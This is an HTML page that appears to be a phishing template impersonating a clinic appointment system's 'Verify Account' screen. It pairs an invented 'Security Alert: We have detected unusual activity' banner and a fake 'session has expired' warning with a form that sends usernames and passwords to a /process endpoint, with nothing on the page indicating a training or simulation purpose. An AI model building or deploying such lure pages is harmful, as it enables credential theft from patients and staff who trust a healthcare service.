<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Clinic Appointment System - Verify Account</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
    <style>
        body {
            opacity: 0;
            transition: opacity 0.5s ease-in-out;
            background-color: #f8f9fa;
        }
        .btn {
            transition: all 0.3s ease-in-out;
        }
        .btn:hover {
            transform: scale(1.05);
            box-shadow: 0px 4px 10px rgba(0, 0, 0, 0.2);
        }
        .slide-in {
            animation: slideIn 0.5s ease-out;
        }
        @keyframes slideIn {
            from { transform: translateY(-20px); opacity: 0; }
            to { transform: translateY(0); opacity: 1; }
        }
        .security-banner {
            background-color: #dc3545;
            color: white;
            padding: 10px;
            margin-bottom: 20px;
            border-radius: 5px;
            font-size: 14px;
        }
        .clinic-logo {
            max-width: 200px;
            margin: 0 auto 20px auto;
            display: block;
        }
    </style>
    <script>
        document.addEventListener("DOMContentLoaded", function() {
            document.body.style.opacity = 1;
        });
    </script>
</head>
<body class="d-flex justify-content-center align-items-center vh-100">
    <div class="card shadow-lg p-4" style="width: 400px;">
        <h2 class="text-center mb-2">Clinic Appointment System</h2>
        <p class="text-center text-muted mb-4">Please verify your account</p>
        
        <div class="security-banner">
            <i class="fas fa-shield-alt me-2"></i> Security Alert: We have detected unusual activity. Please verify your account to continue.
        </div>
        
        <div class="alert alert-warning slide-in">
            Your session has expired. Please login again to access your appointments.
        </div>

        <form method="POST" action="/process">
            <div class="mb-3">
                <label class="form-label">Username:</label>
                <input type="text" name="username" class="form-control form-control-lg" required>
            </div>

            <div class="mb-3">
                <label class="form-label">Password:</label>
                <input type="password" name="password" class="form-control form-control-lg" required>
            </div>

            <button type="submit" class="btn btn-success btn-lg w-100">Verify Account</button>
        </form>

        <div class="text-center mt-3">
            <p><small>Having trouble? <a href="#">Contact support</a></small></p>
        </div>
        
        <div class="text-center mt-3">
            <p><small class="text-muted">Â© 2023 Clinic Appointment System</small></p>
        </div>
    </div>
</body>
</html>
